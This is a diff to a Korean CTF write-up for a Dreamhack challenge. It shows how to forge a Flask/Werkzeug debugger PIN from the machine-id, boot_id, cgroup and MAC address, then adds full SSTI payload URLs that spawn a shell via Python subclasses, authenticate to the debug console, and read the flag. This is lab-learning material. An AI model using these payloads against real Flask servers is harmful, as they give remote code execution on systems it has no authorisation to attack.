@@ -142,19 +142,19 @@ PIN 번호를 생성하기 위한 코드는 다음과 같다.
 
 먼저 probably_public_bits 리스트의 각 요소는 다음의 의미를 가지고 있다.
 
-### username : app.py를 실행한 사용자의 이름 
+#### username : app.py를 실행한 사용자의 이름 
 
-### modname : 일반적으로 flask.app 으로 지정됨.
+#### modname : 일반적으로 flask.app 으로 지정됨.
 
-### getattr(app, "__name__", type(app).__name__) : 일반적으로 Flask로 지정됨.
+#### getattr(app, "__name__", type(app).__name__) : 일반적으로 Flask로 지정됨.
 
-### getattr(mod, "__file__", None) : 서버 측 Flask 모듈 폴더의 app.py 파일이 존재하는 절대경로. 파이썬 버전마다 다르므로 확인이 필요함. (일반적으로 usr/local/lib/python[python_version]/site-packages/flask/app.py)
+#### getattr(mod, "__file__", None) : 서버 측 Flask 모듈 폴더의 app.py 파일이 존재하는 절대경로. 파이썬 버전마다 다르므로 확인이 필요함. (일반적으로 usr/local/lib/python[python_version]/site-packages/flask/app.py)
 
 그리고 private_bits 리스트의 각 요소(str(uuid.getnode()), get_machine_id())는 다음과 같다.
 
-### str(uuid.getnode()) : uuid.getnode() 함수는 서버 측 PC의 MAC 주소를 int형으로 반환한다.
+#### str(uuid.getnode()) : uuid.getnode() 함수는 서버 측 PC의 MAC 주소를 int형으로 반환한다.
 
-### get_machine_id()
+#### get_machine_id() 함수는 아래와 같이 작성되어있다.
 
 ```
 def get_machine_id() -> str | bytes | None:
@@ -193,12 +193,50 @@ def get_machine_id() -> str | bytes | None:
 
 먼저 /etc/machine-id, /proc/sys/kernel/random/boot-id 두 파일의 내용을 한 줄 가져와서 합친 후 linux 변수에 저장하고 /proc/self/cgroup 파일의 내용을 한 줄 가져와서 strip().rpartition(b"/")[2] 한 값을 linux 변수에 이어붙인다. 
 
- 
-
 probably_public_bits 리스트의 요소 값들은 취약점을 통해 알아내지 않아도 유추가 가능하기 때문에 private_bits 리스트의 각 요소 값들을 알아내야한다. 
 
- 
-
 uuid.getnode() 함수의 반환 값을 알아내기 위해 /sys/class/net/eth0/address 파일의 내용을 출력하여 MAC 주소를 알아낸 후 int 형으로 변환하였다. 그리고 get_machine_id() 함수의 반환값을 알아내기 위해 /etc/machine-id 파일의 내용을 출력하였으나 파일이 존재하지 않았다. 따라서 /proc/sys/kernel/random/boot_id 파일과 /proc/self/cgroup 파일의 내용을 출력하여 get_machine_id() 함수의 반환값을 알아내었으며 그 결과는 다음과 같다.
+
+```
+probably_public_bits = [
+	'root',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'187999308491777',# str(uuid.getnode()),  /sys/class/net/ens33/address 
+	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+	'adea9fdb-33e3-49e4-84b4-1cb775dd8a49libpod-bc9307ab42df53a0184e74603c26528d6cd87bfa8e3950343122b0f4f108960c'
+]
+```
+
+이제 이 값들을 가지고 PIN 번호를 생성하였다.
+
+PIN : 507-842-243
+
+이제 이 PIN 번호가 포함된 요청을 서버 측으로 전송하여 PIN 인증을 진행하였다.
+
+```
+# 요청 URL
+http://host1.dreamhack.games:12487/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[398]('curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s=EhQek8v6ekhIjJ6gdZaH%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin=507-842-243',shell=True,stdout=-1).communicate()%20%7D%7D
+```
+
+요청을 보낸 결과 PIN 인증에 성공하였으며 발급된 쿠키 값을 확인할 수 있었다.
+
+![image](./images/24_수정.png)
+
+이제 PIN 인증에 성공하여 쿠키 값을 획득하였으며 획득한 쿠키 값과 실행시킬 파이썬 코드를 포함한 요청을 디버그 터미널 페이지로 보낸 결과 flag를 획득할 수 있었다.
+
+#### 최종 공격 payload
+
+```
+http://host1.dreamhack.games:12487/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[398](%22curl%20-G%20-b%20'__wzd5b4127f2fcda3606095a=1722402374|496a1454c977'%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s=EhQek8v6ekhIjJ6gdZaH%20--data-urlencode%20frm=0%20--data-urlencode%20'''cmd=__import__(%5C%22os%5C%22).popen(%5C%22cat%20%2Fflag%5C%22).read();'''%22,shell=True,stdout=-1).communicate()%20%7D%7D
+```
+
+![image](./images/25_수정.png)
+
+
 
 
